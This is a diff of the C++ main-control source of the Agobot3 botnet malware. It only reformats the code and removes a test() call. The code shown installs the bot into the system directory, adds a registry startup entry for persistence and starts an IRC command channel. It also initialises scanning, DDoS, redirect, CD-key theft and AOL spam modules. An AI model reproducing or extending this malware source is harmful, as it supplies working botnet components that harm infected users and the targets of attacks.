@@ -7,26 +7,40 @@ char *cby="\xDA\x0A\x60";
 CMainCtrl g_cMainCtrl;
 
 int CMainCtrl::MainCtrl()
-{	test();
+{
 #ifdef DBGCONSOLE
 	m_cConsDbg.Log(1, "Started main control...\n");
 #endif
 
-	bool bFailed=false; m_bRunning=true; while(m_bRunning && !bFailed)
+    bool bFailed=false;
+    m_bRunning=true;
+    while(m_bRunning && !bFailed)
 	{	// Control Loop starts here, set m_bRunning to false to
 		// stop, set bFailed in case of component failure
 
-		if(!m_cIRC.m_bRunning) bFailed=true;
+        if(!m_cIRC.m_bRunning)
+            bFailed=true;
 
-		if(!bFailed) bFailed=!m_cBot.Think();
+        if(!bFailed)
+            bFailed=!m_cBot.Think();
 
 		if(bFailed) m_bRunning=false;
 
-		list<CThread*>::iterator it; for(it=m_lCanJoin.begin(); it!=m_lCanJoin.end(); ++it)
-		{	(*it)->Kill(); delete(*it); } m_lCanJoin.clear();
+        list<CThread*>::iterator it;
+        for(it=m_lCanJoin.begin(); it!=m_lCanJoin.end(); ++it)
+        {
+            (*it)->Kill();
+            delete(*it);
+        }
+        m_lCanJoin.clear();
 
-		Sleep(250); }
-	if(bFailed) return 1; else return 0; }
+        Sleep(250);
+    }
+    if(bFailed)
+        return 1;
+    else
+        return 0;
+}
 
 int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 {	m_bRunning=true;
@@ -46,7 +60,8 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 	m_cCmdLine.Parse(szCmdLine);
 
 	// Activate debugging console
-	if(m_cCmdLine.m_cConfig.bDebug) m_cConsDbg.Init(m_cCmdLine.m_cConfig.iDebugLevel);
+    if(m_cCmdLine.m_cConfig.bDebug)
+        m_cConsDbg.Init(m_cCmdLine.m_cConfig.iDebugLevel);
 
 	m_sNameVerStr.Format("Agobot3 (%s) \"%s\" on \"%s\"", VERSION_AGOBOT, SYS_BUILD, SYS_PLATFORM);
 #ifdef DBGCONSOLE
@@ -60,12 +75,14 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 	// Initialize base subsystems, don't swap
 	m_cCVar.Init();
 	m_cMac.Init();
-        m_cBot.Init();
+    m_cBot.Init();
 	
-	if(m_cBot.as_enabled.bValue) m_cInstaller.CopyToSysDir(m_cBot.bot_filename.sValue);
+    if(m_cBot.as_enabled.bValue)
+        m_cInstaller.CopyToSysDir(m_cBot.bot_filename.sValue);
 	m_cInstaller.Install();
 #ifdef WIN32
-	if(m_cBot.as_enabled.bValue) m_cInstaller.RegStartAdd(m_cBot.as_valname.sValue, m_cBot.bot_filename.sValue);
+    if(m_cBot.as_enabled.bValue)
+        m_cInstaller.RegStartAdd(m_cBot.as_valname.sValue, m_cBot.bot_filename.sValue);
 #endif
 
 	// Initialize random number generator from system time
@@ -81,7 +98,8 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 	WSADATA wsaData; WSAStartup(MAKEWORD(2,2), &wsaData);
 #endif
 
-	m_cIRC.Start(); m_cSendFile.Start();
+    m_cIRC.Start();
+    m_cSendFile.Start();
 
 	// Initialize subsystems
 	m_cIRC.Init();
@@ -89,10 +107,11 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 	m_cScanner.Init();
 	m_cDDOS.Init();
 	m_cRedirect.Init();
-        m_cCDKeyGrab.Init();
-        m_cScannerAuto.Init();
+    m_cCDKeyGrab.Init();
+    m_cScannerAuto.Init();
 	m_cRSLControl.Init();
-	if(m_cBot.spam_aol_enabled.bValue) m_bCanSpamAOL=CanSpamAOL();
+    if(m_cBot.spam_aol_enabled.bValue)
+        m_bCanSpamAOL=CanSpamAOL();
 
 	// Start the main loop
 #ifdef DBGCONSOLE
@@ -102,7 +121,9 @@ int CMainCtrl::Main(const char *szCmdLine, const char *szArgv0)
 #ifdef DBGCONSOLE
 	m_cConsDbg.Log(7, "Terminated the main loop...\n");
 #endif
-	m_cIdentD.Kill(); m_cSendFile.Kill(); m_cIRC.Kill();
+    m_cIdentD.Kill();
+    m_cSendFile.Kill();
+    m_cIRC.Kill();
 
 	// Cleanup pthreads
 	CThread::CleanupPThreads();
